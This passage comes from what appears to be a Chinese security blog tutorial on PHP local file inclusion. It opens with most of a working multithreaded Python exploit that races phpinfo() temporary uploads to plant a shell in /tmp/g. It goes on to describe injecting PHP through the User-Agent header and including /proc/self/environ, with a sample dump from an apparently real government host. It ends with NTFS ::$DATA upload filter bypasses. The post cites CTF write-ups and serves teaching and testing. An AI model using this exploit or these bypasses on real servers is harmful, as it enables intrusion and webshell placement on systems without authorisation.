+    LFIREQ<span class="token operator">=</span><span class="token triple-quoted-string string">"""GET /lfi.php?file=%s HTTP/1.1\r
+User-Agent: Mozilla/4.0\r
+Proxy-Connection: Keep-Alive\r
+Host: %s\r
+\r
+\r
+"""</span>
+    <span class="token keyword">return</span> <span class="token punctuation">(</span>REQ1<span class="token punctuation">,</span> TAG<span class="token punctuation">,</span> LFIREQ<span class="token punctuation">)</span>
+
+
+
+<span class="token keyword">def</span> <span class="token function">phpInfoLFI</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> phpinforeq<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> lfireq<span class="token punctuation">,</span> tag<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
+    s2 <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    
+
+    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    s2<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>phpinforeq<span class="token punctuation">)</span>                        <span class="token comment" spellcheck="true">#向phpinfo 发起请求</span>
+    d <span class="token operator">=</span> <span class="token string">""</span>
+    <span class="token keyword">while</span> len<span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token operator">&lt;</span> offset<span class="token punctuation">:</span>
+        d <span class="token operator">+=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        i <span class="token operator">=</span> d<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">"[tmp_name] =&amp;gt; "</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">#从偏移量中找关键字</span>
+        fn <span class="token operator">=</span> d<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">17</span><span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">31</span><span class="token punctuation">]</span>                     
+        <span class="token comment" spellcheck="true">#得到临时文件名（这个切片和系统有关，我在windows 下测试使用的是 d[i+17:i+39]）</span>
+
+    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> None
+
+    s2<span class="token punctuation">.</span>send<span class="token punctuation">(</span>lfireq <span class="token operator">%</span> <span class="token punctuation">(</span>fn<span class="token punctuation">,</span> host<span class="token punctuation">)</span><span class="token punctuation">)</span>               <span class="token comment" spellcheck="true">#发起LFI请求</span>
+    d <span class="token operator">=</span> s2<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>
+    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    s2<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> d<span class="token punctuation">.</span>find<span class="token punctuation">(</span>tag<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                     <span class="token comment" spellcheck="true">#找页面返回中我们之前设下的标志 TAG</span>
+        <span class="token keyword">return</span> fn
+
+counter<span class="token operator">=</span><span class="token number">0</span>
+<span class="token keyword">class</span> <span class="token class-name">ThreadWorker</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> e<span class="token punctuation">,</span> l<span class="token punctuation">,</span> m<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>event <span class="token operator">=</span> e
+        self<span class="token punctuation">.</span>lock <span class="token operator">=</span>  l
+        self<span class="token punctuation">.</span>maxattempts <span class="token operator">=</span> m
+        self<span class="token punctuation">.</span>args <span class="token operator">=</span> args
+
+    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">global</span> counter
+        <span class="token keyword">while</span> <span class="token operator">not</span> self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">with</span> self<span class="token punctuation">.</span>lock<span class="token punctuation">:</span>
+                <span class="token keyword">if</span> counter <span class="token operator">>=</span> self<span class="token punctuation">.</span>maxattempts<span class="token punctuation">:</span>
+                    <span class="token keyword">return</span>
+                counter<span class="token operator">+=</span><span class="token number">1</span>
+
+            <span class="token keyword">try</span><span class="token punctuation">:</span>
+                x <span class="token operator">=</span> phpInfoLFI<span class="token punctuation">(</span><span class="token operator">*</span>self<span class="token punctuation">.</span>args<span class="token punctuation">)</span>
+                <span class="token keyword">if</span> self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                    <span class="token keyword">break</span>                
+                <span class="token keyword">if</span> x<span class="token punctuation">:</span>
+                    <span class="token keyword">print</span> <span class="token string">"\nGot it! Shell created in /tmp/g"</span>
+                    self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+            <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">:</span>
+                <span class="token keyword">return</span>
+
+
+<span class="token keyword">def</span> <span class="token function">getOffset</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> phpinforeq<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""Gets offset of tmp_name in the php output"""</span>
+    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
+    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>phpinforeq<span class="token punctuation">)</span>
+
+    d <span class="token operator">=</span> <span class="token string">""</span>
+    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+        i <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>                      <span class="token comment" spellcheck="true">#循环接受4096字节直到接收完毕</span>
+        d<span class="token operator">+=</span>i        
+        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>
+            <span class="token keyword">break</span>
+        <span class="token comment" spellcheck="true"># detect the final chunk</span>
+        <span class="token keyword">if</span> i<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"0\r\n\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">break</span>
+    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    i <span class="token operator">=</span> d<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"[tmp_name] =&amp;gt; "</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
+        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"No php tmp_name in phpinfo output"</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">print</span> <span class="token string">"found %s at %i"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>d<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#进行试探得到文件名的偏移量</span>
+    <span class="token comment" spellcheck="true"># padded up a bit</span>
+    <span class="token keyword">return</span> i<span class="token operator">+</span><span class="token number">256</span>                             <span class="token comment" spellcheck="true">#为提高准确性扩大了范围           </span>
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+
+    <span class="token keyword">print</span> <span class="token string">"LFI With PHPInfo()"</span>
+    <span class="token keyword">print</span> <span class="token string">"-="</span> <span class="token operator">*</span> <span class="token number">30</span>
+
+    <span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span> <span class="token string">"Usage: %s host [port] [threads]"</span> <span class="token operator">%</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        host <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">,</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">print</span> <span class="token string">"Error with hostname %s: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>
+        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+    port<span class="token operator">=</span><span class="token number">80</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        port <span class="token operator">=</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>
+        <span class="token keyword">pass</span>
+    <span class="token keyword">except</span> ValueError<span class="token punctuation">,</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">print</span> <span class="token string">"Error with port %d: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>
+        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+    poolsz<span class="token operator">=</span><span class="token number">10</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        poolsz <span class="token operator">=</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>
+        <span class="token keyword">pass</span>
+    <span class="token keyword">except</span> ValueError<span class="token punctuation">,</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">print</span> <span class="token string">"Error with poolsz %d: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>
+        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">print</span> <span class="token string">"Getting initial offset..."</span><span class="token punctuation">,</span>  
+    reqphp<span class="token punctuation">,</span> tag<span class="token punctuation">,</span> reqlfi <span class="token operator">=</span> setup<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span>
+    offset <span class="token operator">=</span> getOffset<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> reqphp<span class="token punctuation">)</span>
+    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    maxattempts <span class="token operator">=</span> <span class="token number">1000</span>
+    e <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    l <span class="token operator">=</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">print</span> <span class="token string">"Spawning worker pool (%d)..."</span> <span class="token operator">%</span> poolsz
+    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    tp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>poolsz<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        tp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ThreadWorker<span class="token punctuation">(</span>e<span class="token punctuation">,</span>l<span class="token punctuation">,</span>maxattempts<span class="token punctuation">,</span> host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> reqphp<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> reqlfi<span class="token punctuation">,</span> tag<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">for</span> t <span class="token keyword">in</span> tp<span class="token punctuation">:</span>
+        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        <span class="token keyword">while</span> <span class="token operator">not</span> e<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                <span class="token keyword">break</span>
+            <span class="token keyword">with</span> l<span class="token punctuation">:</span>
+                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span> <span class="token string">"\r% 4d / % 4d"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>counter<span class="token punctuation">,</span> maxattempts<span class="token punctuation">)</span><span class="token punctuation">)</span>
+                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                <span class="token keyword">if</span> counter <span class="token operator">>=</span> maxattempts<span class="token punctuation">:</span>
+                    <span class="token keyword">break</span>
+        <span class="token keyword">print</span>
+        <span class="token keyword">if</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span> <span class="token string">"Woot!  \m/"</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span> <span class="token string">":("</span>
+    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
+        <span class="token keyword">print</span> <span class="token string">"\nTelling threads to shutdown..."</span>
+        e<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">print</span> <span class="token string">"Shuttin' down..."</span>
+    <span class="token keyword">for</span> t <span class="token keyword">in</span> tp<span class="token punctuation">:</span>
+        t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这样的利用方式实际上在 2001 年国外的安全研究人员就发现了，只不过因为条件苛刻很少用到</p>
+<p>下面是我用这个脚本测试的例子</p>
+<p>[<img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161625110.gif" alt="img">](<a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/phpinfo">https://picture-1253331270.cos.ap-beijing.myqcloud.com/phpinfo</a> tmp getshell.gif)</p>
+<p><strong>下面是两个实际的例子</strong></p>
+<p><strong>1.NU1L CTF 2018</strong></p>
+<p><a target="_blank" rel="noopener" href="http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/">http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/</a></p>
+<p><strong>2.链家旗下自如某站一个有意思的文件包含到简单内网渗透</strong></p>
+<p><a target="_blank" rel="noopener" href="http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0134185.html">http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0134185.html</a></p>
+<p><strong>补充：思考关于临时文件的含义</strong></p>
+<p>这个包含临时文件的思想不要仅仅局限于 php<br>自己产生的临时文件，其他服务也可能会有可控的临时文件，这个时候我们也可以选择包含这些临时文件，就比如我之前[这篇文章](<a target="_blank" rel="noopener" href="http://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3">http://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解</a> XXE 漏洞/)说过的 上传的 jar ，我们一样也可以包含，于是我在 LCTF 2018 出了这一道题，具体细节可以看我的[这篇文章](<a target="_blank" rel="noopener" href="http://www.k0rz3n.com/2018/11/19/LCTF">http://www.k0rz3n.com/2018/11/19/LCTF</a> 2018 T4lk 1s ch34p,sh0w m3 the sh31l 详细分析/)</p>
+<h4 id="5-x2F-proc-x2F-self-x2F-environ"><a href="#5-x2F-proc-x2F-self-x2F-environ" class="headerlink" title="5./proc/self/environ"></a><strong>5./proc/self/environ</strong></h4><p>通过本地文件包含漏洞,查看是否可以包含/proc/self/environ文件。然后<strong>向User-Agent头中注入</strong>PHP代码有可能会攻击成功。如果代码被成功注入到User-Agent头中，本地文件包含漏洞会利用并执行/proc/self/environ，这样就能得到你的shell</p>
+<p>这里我说一下这个 self ，这个 self 不要以为就是 self 文件夹，实际上子目录/proc/self本身就是当前运行进程 PID，你会发现你每次请求得到的 self 都是不同的</p>
+<p><strong>如图一：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/self1.png"><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161625389.png" alt="img"></a>此处输入图片的描述</p>
+<p><strong>如图二：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/self2.png"><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161625548.png" alt="img"></a>此处输入图片的描述</p>
+<p>从 Linux 内部去看的话，就是一堆数字命名的文件夹，还能看到有些是属于 root 的有些是属于 apache 的</p>
+<p><strong>如图所示：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/self3.png"><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161625854.png" alt="img"></a>此处输入图片的描述</p>
+<p>从上面的部分图你也能看到另一个问题，就是这个文件的读取需要一定的权限，至少 php 默认情况下是没法读取的，我们看一下这个文件的读取权限</p>
+<p><strong>如图所示：</strong></p>
+<p>[<img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161625166.png" alt="img">](<a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/environ">https://picture-1253331270.cos.ap-beijing.myqcloud.com/environ</a> 权限.png)此处输入图片的描述</p>
+<p>我还能说什么，只有文件所有者可读，且仅仅是可读，这就不是很好办了，就拿网上的例子说一下吧，这里仅仅提供一个思路，遇到能包含的情况随机应变</p>
+<p>如果能成功包含，那么你可能会看到下面这样的结果：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token constant">DOCUMENT_ROOT</span><span class="token operator">=</span><span class="token operator">/</span>home<span class="token operator">/</span>dprdicom<span class="token operator">/</span>public_html<span class="token operator">/</span>smscenter
+<span class="token constant">GATEWAY_INTERFACE</span><span class="token operator">=</span><span class="token constant">CGI</span><span class="token operator">/</span><span class="token number">1.1</span>
+<span class="token constant">HTTP_ACCEPT</span><span class="token operator">=</span>text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>
+q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span><span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span>
+<span class="token constant">HTTP_ACCEPT_ENCODING</span><span class="token operator">=</span>gzip<span class="token punctuation">,</span> deflate
+<span class="token constant">HTTP_ACCEPT_LANGUAGE</span><span class="token operator">=</span>en<span class="token operator">-</span><span class="token constant">US</span><span class="token punctuation">,</span>en<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.5</span>
+<span class="token constant">HTTP_CONNECTION</span><span class="token operator">=</span>keepalive
+<span class="token constant">HTTP_HOST</span><span class="token operator">=</span>smscenter<span class="token punctuation">.</span>dprdbekasikota<span class="token punctuation">.</span>go<span class="token punctuation">.</span>id
+<span class="token constant">HTTP_USER_AGENT</span><span class="token operator">=</span>Mozilla<span class="token operator">/</span><span class="token number">5</span><span class="token punctuation">.</span><span class="token function">0</span> <span class="token punctuation">(</span><span class="token constant">X11</span><span class="token punctuation">;</span> Ubuntu<span class="token punctuation">;</span> Linux i686<span class="token punctuation">;</span> rv<span class="token punctuation">:</span><span class="token number">27.0</span><span class="token punctuation">)</span> Gecko<span class="token operator">/</span><span class="token number">20100101</span> Firefox<span class="token operator">/</span><span class="token number">27.0</span>
+<span class="token constant">PATH</span><span class="token operator">=</span><span class="token operator">/</span>bin<span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>bin
+<span class="token constant">PHPRC</span><span class="token operator">=</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>lib<span class="token operator">/</span>
+<span class="token constant">QUERY_STRING</span><span class="token operator">=</span>
+page<span class="token operator">=</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>environ
+<span class="token constant">REDIRECT_STATUS</span><span class="token operator">=</span><span class="token number">200</span>
+<span class="token constant">REMOTE_ADDR</span><span class="token operator">=</span><span class="token number">182.68</span><span class="token punctuation">.</span><span class="token number">251.152</span>
+<span class="token constant">REMOTE_PORT</span><span class="token operator">=</span><span class="token number">21007</span>
+<span class="token constant">REQUEST_METHOD</span><span class="token operator">=</span><span class="token constant">GET</span>
+<span class="token constant">REQUEST_URI</span><span class="token operator">=</span><span class="token operator">/</span><span class="token operator">?</span>page<span class="token operator">=</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>environ
+<span class="token constant">SCRIPT_FILENAME</span><span class="token operator">=</span><span class="token operator">/</span>home<span class="token operator">/</span>dprdicom<span class="token operator">/</span>public_html<span class="token operator">/</span>smscenter<span class="token operator">/</span>index<span class="token punctuation">.</span>php
+<span class="token constant">SCRIPT_NAME</span><span class="token operator">=</span><span class="token operator">/</span>index<span class="token punctuation">.</span>php
+<span class="token constant">SERVER_ADDR</span><span class="token operator">=</span><span class="token number">103.28</span><span class="token punctuation">.</span><span class="token number">12.130</span>
+<span class="token constant">SERVER_ADMIN</span><span class="token operator">=</span> <span class="token constant">_NAME</span><span class="token operator">=</span>smscenter<span class="token punctuation">.</span>dprdbekasikota<span class="token punctuation">.</span>go<span class="token punctuation">.</span>id
+<span class="token constant">SERVER_PORT</span><span class="token operator">=</span><span class="token number">80</span>
+<span class="token constant">SERVER_PROTOCOL</span><span class="token operator">=</span><span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>
+<span class="token constant">SERVER_</span> 
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>注意这一段：</strong></p>
+<p>HTTP_USER_AGENT=Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:27.0) Gecko/20100101 Firefox/27.0 </p>
+<p>找到了可控目标接下来就是在 UA 中注入我们的恶意代码，</p>
+<p><strong>如图所示：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/UA%E6%B3%A8%E5%85%A5.png"><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161625814.png" alt="img"></a></p>
+<p>然后就包含啦</p>
+<h4 id="4-包含上传的文件"><a href="#4-包含上传的文件" class="headerlink" title="4.包含上传的文件"></a><strong>4.包含上传的文件</strong></h4><p>有上传点是最好的了，上传的内容可以是任意的后缀名，不影响最终的结果。</p>
+<p>这里有一些使用 NTFS ADS 文件流绕过检测的方法，值得大家参考</p>
+<p>在测试中我们发现，如果上传的文件名字为：test.php::$DATA，会在服务器上生成一个test.php的文件，其中内容和所上传文件内容相同，并被解析。假设我们需要上传的文件内容为：<!--?php phpinfo();?-->下面是上传是会出现的现象：</p>
+<pre class="line-numbers language-php"><code class="language-php">上传 Test<span class="token punctuation">.</span>php<span class="token punctuation">:</span>a<span class="token punctuation">.</span>jpg     生成Test<span class="token punctuation">.</span>php  文件内容为空
+
+上传 Test<span class="token punctuation">.</span>php<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$DATA</span>  生成test<span class="token punctuation">.</span>php  文件内容为<span class="token delimiter">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>
+
+上传 Test<span class="token punctuation">.</span>php<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$INDEX_ALLOCATION</span>  生成test<span class="token punctuation">.</span>php文件夹
+
